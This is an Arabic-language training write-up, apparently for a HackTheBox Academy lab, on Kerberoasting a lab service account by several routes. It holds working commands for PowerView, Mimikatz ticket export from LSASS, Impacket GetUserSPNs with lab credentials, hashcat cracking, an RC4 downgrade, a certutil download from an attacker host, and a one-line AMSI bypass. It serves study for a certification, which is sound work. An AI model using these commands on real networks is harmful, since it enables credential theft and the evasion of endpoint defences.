- EType 18: يعني AES-256 (تشفير حديث، قوي جداً، ياخذ أيام أو أسابيع للكسر).
    

.kirbi (ملف الكيربي)

- شنو يعني؟ الامتداد الخاص بملفات تذاكر Kerberos من تستخرجها بشكل خام (Raw) من الذاكرة باستخدام Mimikatz. هذا الملف ما تكدر تكسره بـ Hashcat مباشرة، لازم تحوله إلى نص Hash بالبداية.
    

Impacket (حزمة إمباكيت)

- شنو يعني؟ مجموعة سكريبتات مكتوبة بـ Python باللينكس، تتحدث نفس لغة الويندوز والـ AD. تسمحلك تهاجم الويندوز من داخل الكالي لينكس مالتك بدون ما تحتاج تدخل RDP للضحية.
    

Execution Policy (سياسة التنفيذ)

- شنو يعني؟ إعداد بالويندوز يمنع تشغيل سكريبتات PowerShell (ملفات .ps1) اللي ما تحمل توقيع رقمي. هاي مو ميزة أمنية قوية، هي مجرد حماية من الأخطاء، ونتجاوزها بكلمة `Bypass`.
    

━━━━━

🟡 المرحلة 2: تحليل التحدي + كيف تفكر

📖 ترجمة السيناريو الحالي:

السؤال يطلب منك الحصول على نفس التذكرة للحساب `vmware/inlanefreight.local` وكسرها، لكن هذه المرة يفترض أن الأداة السهلة (Rubeus) غير متاحة، أو أن هناك قيوداً تمنعك من استخدامها. يجب عليك إيجاد طرق بديلة للوصول للهدف.

🎯 المعطيات والقيود:

- قد لا تمتلك أدوات جاهزة على القرص الصلب (Hard Disk).
    
- قد يتدخل Windows Defender لحذف أي برنامج ضار.
    
- قد تكون التذاكر المطلوبة مخزنة بالفعل في الذاكرة ولا حاجة لطلبها من الـ DC.
    

🧭 كيف تفكر؟ (Decision Tree متقدمة للـ Kerberoasting):

أنا بحاجة لتذكرة TGS، ما هي خياراتي بناءً على وضعي الحالي؟

├── هل أمتلك صلاحيات مدير (Local Administrator) على هذه الحاسبة؟

│ ├── نعم: ممتاز! لا تطلب تذكرة جديدة. استخدم `Mimikatz` لسرقة التذاكر الموجودة أصلاً في ذاكرة الـ LSASS. (أهدأ طريقة).

│ └── لا: أنا مستخدم عادي. انتقل للفرع التالي.

│

├── هل أستطيع نقل ملفات من الكالي إلى الويندوز؟ (Rubeus)

│ ├── لا، الـ Antivirus يحذفها فوراً. انتقل للفرع التالي.

│ └── نعم: استخدم Rubeus.

│

├── هل الـ PowerShell مسموح ويعمل؟

│ ├── نعم: استخدم أداة `PowerView`. إذا اعترض الـ AMSI، قم بعمل Bypass له.

│ └── لا: استخدم أدوات الويندوز الأصلية.

│

├── هل توجد أدوات الويندوز الأصلية الخاصة بالـ AD (RSAT)؟

│ ├── نعم: استخدم وحدة `ActiveDirectory` في الـ PowerShell.

│ └── لا: استخدم أداة `setspn.exe` المدمجة بالويندوز من أيام XP لاستخراج اسم الحساب على الأقل.

│

└── هل أستطيع الوصول للـ Domain Controller من الكالي لينكس عبر الشبكة؟

└── نعم: اترك الويندوز تماماً! استخدم `Impacket (GetUserSPNs.py)` من الكالي براحتك.

🗺️ خريطة الهجوم (Roadmap) للسيناريوهات البديلة:

١. [الطريق الأول - PowerShell]: تحميل PowerView للذاكرة، تجاوز سياسة التنفيذ، وسحب الهاش.

٢. [الطريق الثاني - الذاكرة]: الدخول كـ Admin، تشغيل Mimikatz، سحب التذاكر بصيغة `.kirbi`، تحويلها باللينكس، ثم كسرها.

٣. [الطريق الثالث - النينجا]: استخدام `setspn.exe` وأدوات النظام كـ LOLBins لجمع المعلومات بهدوء تام.

٤. [الطريق الرابع - اللينكس]: الهجوم من بُعد باستخدام أدوات Impacket بدون لمس الويندوز.

الآن، لننتقل إلى التنفيذ العملي لكل طريقة من هذه الطرق.

━━━━━

🟠 المرحلة 3: الاستغلال التفصيلي

هنا راح نستعرض الطرق الأربعة البديلة، خطوة بخطوة.

━━━━━━━━━━━━━━

النهج الأول: أداة PowerView (عبر الـ PowerShell)

━━━━━━━━━━━━━━

📌 ليش نسوي هاي الخطوة؟

إذا كانت ملفات الـ exe (مثل Rubeus) ممنوعة أو تنحذف، الـ PowerShell هو بيئة ممتازة لأنها جزء من النظام. راح نستخدم سكريبت PowerView اللي يسوي كل الشغل.

🔧 الأمر (داخل PowerShell بالويندوز):

PowerShell

```
Import-Module C:\Tools\PowerView.ps1
Get-DomainUser -SPN | Select-Object samaccountname, serviceprincipalname
```

💡 ليش هذا الأمر؟

- `Import-Module`: هذا الأمر يحمّل السكريبت للذاكرة حتى نكدر نستخدم أوامره.
    
- `Get-DomainUser -SPN`: هذا أمر داخل PowerView يسحب كل اليوزرات اللي عدهم SPN مسجل (يعني Kerberoastable).
    
- `Select-Object`: حتى ننظف الشاشة ونعرض بس اسم اليوزر واسم الـ SPN وما نغرق بالمعلومات.
    

📤 الـ Output المتوقع (Recon):

Plaintext

```
samaccountname   serviceprincipalname
--------------   --------------------
sqldev           MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433
svc_vmware       vmware/inlanefreight.local
backupagent      backupjob/veam.inlanefreight.local:4444
```

✅ الخطوة التالية (الهجوم وسحب الهاش):

بما إنه عرفنا الحساب موجود، نستخدم أمر الهجوم بـ PowerView.

🔧 الأمر:

PowerShell

```
Invoke-Kerberoast -OutputFormat Hashcat | Select-Object Hash | Out-File C:\Temp\pv_hashes.txt
```

💡 شرح: `Invoke-Kerberoast` هو الأمر اللي يطلب التذاكر. `-OutputFormat Hashcat` هذا فلاج عظيم يخلي الناتج جاهز للنسخ لـ Hashcat مباشرة. `Out-File` يكتب الناتج بملف.

━━━━━━━━━━━━━━

النهج الثاني: أداة Mimikatz (سرقة التذاكر من الذاكرة)

━━━━━━━━━━━━━━

📌 ليش نسوي هاي الخطوة؟

تخيل إن موظف الـ IT أو مدير النظام دخل للـ VMware قبل شوية. هذا يعني إن تذكرة الـ VMware موجودة حالياً بذاكرة حاسبته! إذا كنا نملك صلاحية Administrator، نكدر نفتح الذاكرة ونسرقها جاهزة.

🔧 الأمر (افتح CMD كـ Administrator وشغل ميميكاتز):

DOS

```
.\mimikatz.exe
privilege::debug
sekurlsa::tickets /export
```

💡 ليش هاي الأوامر؟

- `privilege::debug`: هذا الأمر يفحص إذا كنت Admin وينطيك صلاحية `SeDebugPrivilege` اللي تسمحلك تقرأ ذاكرة نظام الويندوز (LSASS). إذا شفت `20 OK` يعني أنت جاهز.
    
- `sekurlsa::tickets /export`: هذا الأمر يبحث بذاكرة LSASS عن أي تذكرة Kerberos ويستخرجها ويحفظها كملف بالقرص الصلب.
    

📤 الـ Output المتوقع:

Plaintext

```
mimikatz # sekurlsa::tickets /export

Authentication Id : 0 ; 291923 (00000000:00047453)
Session           : Interactive from 1
User Name         : htb-student
Domain            : INLANEFREIGHT
...
* [0] - 0x17 - rc4_hmac_nt
     Start/End/MaxRenew: 7/31/2026 10:00:00 ...
     Service Name (02) : vmware ; inlanefreight.local
     Target Name  (02) : vmware ; inlanefreight.local

  [Saving 0-40a10000-htb-student@vmware~inlanefreight.local-INLANEFREIGHT.LOCAL.kirbi]
```

✅ الخطوة التالية:

الميميكاتز حفظ التذكرة كملف اسمه ينتهي بـ `.kirbi`. هذا الملف خام. لازم ننقله للينكس مالتنا ونحوله.

🔧 الأمر باللينكس (للتحويل والكسر):

Bash

```
python3 kirbi2hashcat.py ticket.kirbi > hash.txt
hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt
```

💡 `kirbi2hashcat.py` هو سكريبت يحول الملف الخام إلى نص الهاش الطويل اللي يفهمه Hashcat ويبدأ بـ `$krb5tgs$23$`.

⏸️ Mini-check: هل النتيجة منطقية؟ نعم، الهاشكات راح يكسره ويطلع `virtualpc1` نفس الطريقة السابقة بالضبط، بس مصدر التذكرة اختلف!

━━━━━━━━━━━━━━

النهج الثالث: أداة setspn.exe (أسلوب الـ LOLBins المكتوم)

━━━━━━━━━━━━━━

📌 ليش نسوي هاي الخطوة؟

إذا ردت بس تجاوب على السؤال الأول (شنو اسم اليوزر مال الخدمة) بدون ما تنزل أي أداة هكر وبدون ما تلفت أي انتباه. راح نستخدم أداة `setspn` الأصلية بالويندوز.

🔧 الأمر (بأي CMD):

DOS

```
setspn -T inlanefreight.local -Q */*
```

أو للبحث عن خدمة معينة مباشرة:

DOS

```
setspn -Q vmware/inlanefreight.local
```

💡 ليش هذا الأمر؟

- `-T`: تحديد الـ Domain.
    
- `-Q */*`: Query لكل الخدمات المسجلة.
    
- هذه الأداة مخصصة لمدراء الشبكات، لذلك لا يوجد أي Antivirus يمنعها!
    

📤 الـ Output المتوقع:

Plaintext

```
Checking domain DC=inlanefreight,DC=local

CN=svc_vmware,OU=Service Accounts,OU=Corp,DC=inlanefreight,DC=local
        vmware/inlanefreight.local

Existing SPN found!
```

✅ الخطوة التالية:

عرفنا اسم الحساب `svc_vmware`. لكن انتبه: `setspn` ما يسحب التذكرة! هو فقط للـ Recon. لسحب التذكرة، لازم تستخدم إحدى الطرق الأخرى.

━━━━━━━━━━━━━━

النهج الرابع: أداة GetUserSPNs.py (الضربة عن بعد من اللينكس)

━━━━━━━━━━━━━━

📌 ليش نسوي هاي الخطوة؟

ليش نتعب نفسنا داخل الويندوز ونتعارك ويا الـ Defender والـ AMSI؟ إذا كان عندنا IP الـ Domain Controller، واسم يوزر وباسورد، نكدر نسوي الهجوم وإحنا كاعدين مرتاحين بالكالي لينكس!

🔧 الأمر (من الكالي لينكس):

Bash

```
GetUserSPNs.py inlanefreight.local/htb-student:'Academy_student_AD!' -dc-ip TARGET_DC_IP -request -outputfile linux_hashes.txt
```

💡 ليش هذا الأمر بالذات؟

- `GetUserSPNs.py`: سكريبت عظيم من حزمة Impacket.
    
- `inlanefreight.local/htb-student`: نحدد الدومين واليوزر مالتنا.
    
- `-dc-ip`: نعطيه IP الـ Domain controller حتى يروح يطلب منه التذاكر مباشرة.
    
- `-request`: هذا الفلاج يكوله: "أرجوك لا بس تستعرض الأسماء، اطلب التذاكر التشفيرية أيضاً".
    
- `-outputfile`: حفظ الهاشات الجاهزة بملف.
    

📤 الـ Output المتوقع:

Plaintext

```
ServicePrincipalName          Name          MemberOf           PasswordLastSet
----------------------------  ------------  -----------------  -------------------
vmware/inlanefreight.local    svc_vmware    Domain Users       2021-09-13 06:02:16

$krb5tgs$23$*svc_vmware$INLANEFREIGHT.LOCAL$vmware/inlanefreight.local*$...(hash)...
```

✅ الخطوة التالية:

صار عندك الهاش الجاهز بداخل اللينكس مباشرة! لا نقل ملفات ولا وجع راس. تاخذ الملف وتطقه بـ Hashcat `-m 13100` وينتهي الموضوع.

📊 ملخص الأساليب (Attack Pathways ASCII):

```
[Attacker Goal: Get Encrypted TGS]

Way 1 (Memory)   : Mimikatz ──> Reads LSASS ──> Gets .kirbi ──> kirbi2hashcat
Way 2 (PS Script): PowerView ──> Asks DC ──> Outputs Hashcat format
Way 3 (Remote)   : Impacket ──> Network Request to DC ──> Saves Hash on Kali
Way 4 (Standard) : Rubeus ──> Asks DC ──> Outputs Hashcat format
```

📐 ملخص نتائج الأدوات:

|**الأداة**|**هل تتطلب Admin؟**|**هل تستخرج الهاش؟**|**هل هي أداة ويندوز أصلية؟**|
|---|---|---|---|
|Mimikatz|نعم 🛑|نعم (بصيغة kirbi)|لا|
|PowerView|لا|نعم (جاهز)|لا (سكربت)|
|setspn.exe|لا|لا (فقط استطلاع)|نعم ✅|
|Impacket|لا (من الكالي)|نعم (جاهز)|لا (باللينكس)|

━━━━━

🔴 المرحلة 4: ماذا لو تغير؟ (Variations + Bypasses + Traps)

هذا هو الـ Masterclass. هنا نميز بين الحافظ والفاهم. ماذا تفعل عندما تفشل الخطة أ؟

🔄 Variations محتملة وتجاوزها (Bypasses):

🎓 Variation 1: ماذا لو كان الـ Rubeus غير موجود على الويندوز والإنترنت مفصول؟

إذا ما عندك `C:\Tools\Rubeus.exe`، لازم تنقله من الكالي للويندوز المخترق بدون ما يشك الـ Antivirus.

- الحل (LOLBin Download): افتح سيرفر ويب بالكالي `python3 -m http.server 8080`.
    
    ثم من الويندوز، استخدم أداة `certutil.exe` (أداة ويندوز رسمية للشهادات الرقمية بس نستخدمها كـ Download Manager).
    
    🔧 الأمر:
    

DOS

```
certutil.exe -urlcache -split -f http://KALI_IP:8080/Rubeus.exe C:\Temp\Rubeus.exe
```

💡 الأداة راح تسحب الملف وتخزنه. مرات نغير اسم الـ exe حتى نتجاوز الفحص السطحي.

🎓 Variation 2: ماذا لو كانت التذكرة مشفرة بـ AES-256 وليس RC4؟

من تسوي استطلاع، وتشوف الـ EncryptionType هو AES-256، يعني الهاش راح يبدأ بـ `$krb5tgs$18$`. تشفير AES قوي جداً جداً ويكلف أيام لكسره.

- الحل الأول (محاولة إجبار الـ DC على إعطائنا RC4 - Downgrade Attack):
    
    نستخدم Rubeus بفلاج خاص نخدع بيه الـ DC ونكوله "حاسبتي قديمة ما تدعم AES، انطيني التذكرة بـ RC4".
    
    🔧 الأمر:
    

DOS

```
.\Rubeus.exe kerberoast /tgtdeleg /nowrap
```

- الحل الثاني (إذا فشل الإجبار واضطرينا نكسر الـ AES):
    
    لازم نغير الـ Mode بالـ Hashcat.
    
    🔧 الأمر:
    

Bash

```
hashcat -m 19700 hashes.txt /usr/share/wordlists/rockyou.txt
```

⚠️ الـ Mode `19600` هو لـ AES-128 (نوع 17). والـ `19700` هو لـ AES-256 (نوع 18).

🎓 Variation 3: ماذا لو الباسورد مو موجود بـ rockyou.txt؟

طلعتلك رسالة `Status: Exhausted`. يعني القاموس خلص وما لقينا الباسورد.

- الحل (استخدام قواعد التحويل Rules):
    
    الموظفين غالباً يختارون كلمات مثل `Password123!` أو `Company2023`. الـ Rules تاخذ كلمة `password` من القاموس وتولد منها مئات الاحتمالات التلقائية (تضيف أرقام، تكبر حروف).
    
    🔧 الأمر:
    

Bash

```
hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

وإذا الشركة اسمها `inlanefreight`، استخدم أداة `cewl` لسحب كلمات من موقعهم وسوي قاموس مخصص!

🎓 Variation 4: ماذا لو الـ Windows Defender يعمل وحظر تشغيل PowerView؟

الويندوز هسة بي نظام اسمه AMSI يفحص أي سكريبت PowerShell قبل ما يشتغل. إذا شاف كلمة PowerView، يوقفه ويكتب "تم الحظر".

- الحل (AMSI Bypass):
    
    نحقن كود صغير بالذاكرة يعمي عين الـ AMSI للعملية الحالية (يخدعه ويخليه يرجع نتيجة "آمن" لكل شي). هذا الكود يتنفذ _قبل_ ما نستدعي PowerView.
    
    🔧 الأمر (ينسخ ويلصق بالـ PowerShell):
    

PowerShell

```
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

💡 بمجرد تنفيذ هذا السطر السحري، الـ AMSI انطفأ بهاي النافذة. هسة تكدر تسوي `Import-Module PowerView` والويندوز راح يكون أعمى وما يعترض!

═══════════

⚠️ أخطاء كارثية شائعة (الفخوخ - Traps):

🚨 الفخ الأول (مع PowerView): رسالة `Execution Policy Error`.

من تحاول تشغل السكريبت يطلعلك أحمر. هذا مو Antivirus، هذا مجرد حظر تشغيل للسكريبتات غير الموقعة.

- الحل: قبل ما تدخل لـ PowerShell، ادخل بهذا الأمر:
    

DOS

```
powershell -ExecutionPolicy Bypass
```

هذا يتجاوز الحماية البسيطة.

🚨 الفخ الثاني (مع Mimikatz): خطأ `ERROR kuhl_m_privilege_debug ; RtlAdjustPrivilege (20) c0000061`.

من تكتب `privilege::debug` يطلعلك هذا الخطأ المرعب.

- السبب: أنت مو Administrator! الـ Mimikatz يحتاج أعلى الصلاحيات حتى يقدر يدخل بذاكرة الويندوز العميقة. إذا شفت هذا الخطأ، اغلق ميميكاتز فوراً، واستخدم Rubeus أو PowerView لأنها أدوات تشتغل بصلاحية يوزر عادي وتطلب التذكرة عبر الشبكة بدل سرقتها من الذاكرة.
    

🚨 الفخ الثالث (مع setspn): الاعتقاد بأنه يخترق.

الطلاب الجدد يكتبون أمر `setspn` ويشوفون اسم اليوزر، ويدورون وين الـ Hash! أداة `setspn` فقط (Recon). ما تجيب تذاكر، ولا تسوي استغلال. لازم تكمل بـ Rubeus أو Impacket.

🚨 الفخ الرابع (نتيجة /stats فارغة):

إذا شغلت `Rubeus /stats` وما طلعلك أي يوزر، ممكن:

1. أنت ما متصل بالدومين بشكل صحيح. شيك `whoami /fqdn`.
    
2. الدومين كنترولر ما يرد. شيك `ping inlanefreight.local`.
    
3. فعلاً ماكو حسابات مصابة بالشركة (هنا لازم تغير مسار الهجوم بالكامل إلى AS-REP Roasting مثلاً).
    

🔑 Golden Tips (نصيحة ذهبية):

"دائماً خلي حزمة Impacket (خصوصاً GetUserSPNs.py و secretsdump.py) هي خيارك الأول إذا كنت تمتلك يوزر وباسورد وأنت خارج بيئة الويندوز. العمل من نظام اللينكس الخاص بيك (Attacker Machine) يعفيك من القلق بشأن الـ Antivirus، الـ AMSI، وقيود نقل الملفات. العب بملعبك مو بملعبهم!"

━━━━━

💎 الفلاشكاردز — ملخص سريع للحفظ

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔹 Card #1

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

❓ Front: ما هو الفرق الجوهري بين استخراج التذاكر بـ Rubeus واستخراجها بـ Mimikatz؟

✅ Back: Rubeus يطلب تذكرة جديدة من الـ DC ولا يحتاج صلاحيات Admin. بينما Mimikatz يسرق تذاكر موجودة مسبقاً في ذاكرة LSASS ويشترط وجود صلاحيات Admin.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔹 Card #2

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

❓ Front: واجهت خطأ Execution Policy عند محاولة تشغيل PowerView. ما هو الحل؟

✅ Back: تشغيل الـ PowerShell مع فلاج التجاوز: `powershell -ExecutionPolicy Bypass`

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔹 Card #3

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

❓ Front: كيف تقوم بتحميل أداة للويندوز عبر سطر الأوامر دون الاعتماد على المتصفح (LOLBin)؟

✅ Back: باستخدام أداة `certutil.exe` المدمجة بالنظام مع الأعلام `-urlcache -split -f`.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔹 Card #4

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

❓ Front: Mimikatz استخرج التذكرة بصيغة `.kirbi`. كيف تكسرها بـ Hashcat؟

✅ Back: يجب تحويلها أولاً إلى نص عبر سكريبت `kirbi2hashcat.py` في اللينكس، ثم استخدام `hashcat -m 13100`.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔹 Card #5

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

❓ Front: ما هو الـ Mode في Hashcat لتذاكر Kerberos المشفرة بـ AES-256 (EType 18)؟

✅ Back: الـ Mode هو `19700` (بينما `13100` مخصص لـ RC4).

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔹 Card #6

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

❓ Front: أداة الويندوز الأصلية (Native) التي يمكنها استطلاع الـ SPNs بهدوء تام؟

✅ Back: أداة `setspn.exe` (أمر: `setspn -T domain -Q */*`).

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔹 Card #7

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

❓ Front: ما هو الـ AMSI ولماذا يهمنا؟

✅ Back: هو نظام فحص للنصوص البرمجية في ويندوز يمنع تشغيل أدوات مثل PowerView. يجب تنفيذ "AMSI Bypass" في الذاكرة لتعميته قبل الاستيراد.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

━━━━━

📄 ورقة الغش (Cheat Sheet) — للسكرين شوت

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

📄 المخلص النهائي (Advanced Kerberoasting Cheat Sheet)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

⚔️ خوارزمية اختيار الأداة للـ Kerberoasting:

١. هل أنت خارج الويندوز؟ ← استخدم `Impacket (GetUserSPNs.py)`.

٢. هل أنت داخل الويندوز بـ Admin؟ ← استخدم `Mimikatz` لاستخراجها من الذاكرة خلسة.

٣. هل أنت داخل الويندوز كـ User عادي والملفات غير محظورة؟ ← استخدم `Rubeus`.

٤. هل أنت داخل الويندوز والـ exe محظور؟ ← تجاوز الـ AMSI واستخدم `PowerView.ps1`.

٥. هل تريد جمع معلومات فقط بصمت تام؟ ← استخدم `setspn.exe`.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

📐 جدول الأوامر الأساسية المتقدمة:

|**الهدف**|**الأداة / البيئة**|**الأمر**|
|---|---|---|
|سحب عن بعد (Linux)|Impacket|`GetUserSPNs.py domain/user:pass -dc-ip IP -request`|
|فحص الـ SPNs بهدوء|Windows Native|`setspn -T domain.local -Q */*`|
|استيراد PowerView|PowerShell|`Import-Module .\PowerView.ps1`|
|هجوم بـ PowerView|PowerShell|`Invoke-Kerberoast -OutputFormat Hashcat > hash.txt`|
|فحص صلاحية الديباج|Mimikatz|`privilege::debug` (يجب أن يعطي 20 OK)|
|استخراج تذاكر הذاكرة|Mimikatz|`sekurlsa::tickets /export`|
|تنزيل ملف (LOLBin)|cmd (certutil)|`certutil.exe -urlcache -split -f http://IP/file C:\file`|
|تعمية الـ AMSI|PowerShell|`[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)`|
|تحويل .kirbi|Linux Python|`python3 kirbi2hashcat.py ticket.kirbi > hash.txt`|
|إجبار RC4 Downgrade|Rubeus|`.\Rubeus.exe kerberoast /tgtdeleg /nowrap`|

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔢 Hashcat Modes والـ Rules:

|**المهمة**|**الأمر**|
|---|---|
|كسر RC4 (EType 23)|`hashcat -m 13100 hash.txt rockyou.txt`|
|كسر AES-256 (EType 18)|`hashcat -m 19700 hash.txt rockyou.txt`|
|تفعيل الـ Rules (best64)|`hashcat -m 13100 hash.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule`|

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🚨 الفخوخ (لا تنساها):

❌ تشغيل Mimikatz بدون "Run as Administrator" ← سيؤدي لخطأ `c0000061`.

❌ تشغيل PowerView بدون Bypass للـ Execution Policy أو AMSI ← حظر فوري للسكريبت.

❌ استخدام الـ Mode `13100` لكسر تذكرة تبدأ بـ `$krb5tgs$18$` ← سيفشل لأنها AES-256 وتحتاج `19700`.

❌ الاعتقاد أن `setspn.exe` يستخرج الهاش ← هو يستخرج الاسم فقط.

❌ إضاعة الوقت في كسر AES-256 بكلمات ضعيفة ← غالباً يتطلب Rules أو Custom Wordlists قوية ويستغرق وقتاً طويلاً.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🎯 رسالة الختام:

بهيج خلصنا. هسة عندك:

✅ القصة الكبيرة (ليش هالهجوم/التقنية موجودة) — فهمنا إن التنوع بالأدوات هو سلاح الهكر الحقيقي ضد الدفاعات القوية.

✅ كل المصطلحات (PowerView, Mimikatz, LOLBins, AMSI, EType 18...)

✅ كيفية التفكير (decision trees لكل نوع هجوم) — عرفت متى تستخدم Mimikatz (إذا عندك Admin) ومتى ترجع للـ PowerShell.

✅ الاستغلال التفصيلي (خطوة خطوة مع الأوامر) — من أوامر Impacket باللينكس، إلى سرقة التذاكر كـ kirbi وتحويلها.

✅ الـ bypasses والـ variations والفخوخ — غطينا أخطر المواقف: الـ AMSI Bypass، تشفير AES-256، واستخدام certutil للتنزيل.

✅ فلاشكاردز (للمراجعة السريعة)

✅ ورقة الغش (سكرين شوت قبل الـ CTF أو الامتحان)

راجع الفلاشكاردز وورقة الغش قبل كل تحدي — وراح تجد الأنماط مألوفة. هسة أنت مستعد للـ Kerberoasting بأي سيناريو مهما كان معقد! بالتوفيق! 💪


]

```text
╔══════════════════════════════════════════════════════════════════════╗
║                                                                      ║
║  [✓] SESSION COMPLETE — ZERO KNOWLEDGE GAPS DETECTED                 ║
║  [✓] 3 PHASES · ~6,000 WORDS · 6 ATTACK METHODS DOCUMENTED           ║
║  [✓] AUTHORED BY: Hexsein · T4E Channel · CPTS Candidate             ║
║  [→] NEXT TARGET: SEC-[NUM+1] — [REPLACE: NEXT SECTION NAME]         ║
║                                                                      ║
╚══════════════════════════════════════════════════════════════════════╝
```


